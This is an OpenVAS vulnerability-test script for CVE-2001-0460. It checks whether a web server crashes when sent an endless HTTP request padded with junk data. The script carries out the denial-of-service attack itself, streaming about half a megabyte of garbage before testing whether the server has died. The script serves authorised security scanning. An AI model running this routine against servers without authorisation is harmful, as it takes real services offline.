# OpenVAS Vulnerability Test
# $Id: www_infinite_request_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Infinite HTTP request
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to kill the web server by
sending an invalid 'infinite' HTTP request that never ends.

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.";

tag_solution = "upgrade your software or protect it with a filtering reverse proxy";

# References:
# Date:  Thu, 8 Mar 2001 15:04:20 +0100
# From: "Peter_Gründl" <peter.grundl@DEFCOM.COM>
# Subject: def-2001-10: Websweeper Infinite HTTP Request DoS
# To: BUGTRAQ@SECURITYFOCUS.COM
#
# Affected:
# WebSweeper 4.0 for Windows NT

if(description)
{
 script_id(11084);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(2465);
 script_cve_id("CVE-2001-0460");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 name = "Infinite HTTP request";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Infinite HTTP request kills the web server";
 script_summary(summary);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nasl", "httpver.nasl", "http_version.nasl");
 script_exclude_keys("www/vnc");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

########

include("http_func.inc");
include('global_settings.inc');


port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

banner = get_http_banner(port:port);
# WN waits for 30 s before sending back a 408 code
if (egrep(pattern:"Server: +WN/2\.4\.", string:banner)) exit(0);

if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

crap512 = crap(512);
r= http_get(item: '/', port:port);
r= r - '\r\n\r\n';
r= strcat(r, '\r\nReferer: ', crap512);

send(socket:soc, data: r);
cnt = 0;

while (send(socket: soc, data: crap512) > 0) { 
	cnt = cnt+512;
	if(cnt > 524288) {
		r = recv(socket: soc, length: 13, timeout: 2);
		http_close_socket(soc);
		if (r)
		{
			debug_print('r=', r);
			exit(0);
		}
		if(http_is_dead(port:port)) {
			log_print('Infinite request killed the web server on port ', port, ' after ', cnt, ' bytes\n');
			security_warning(port);
			exit(0);
		}

                if ((report_paranoia > 1) || thorough_tests || experimental_scripts)
                {
		m = "
Your web server seems to accept unlimited requests.
It may be vulnerable to the 'WWW infinite request' attack, which
allows a cracker to consume all available memory on your system.

*** Note that OpenVAS was unable to crash the web server
*** so this might be a false alert.

Solution: upgrade your software or protect it with a filtering reverse proxy";
		security_warning(port: port, data: m); 
		}
                exit(0);
	}
}

debug_print(level: 2, 'port=', port, ', CNT=', cnt, '\n');
# Keep the socket open, in case the web server itself is saturated

if(http_is_dead(port: port)) security_hole(port); 

http_close_socket(soc);

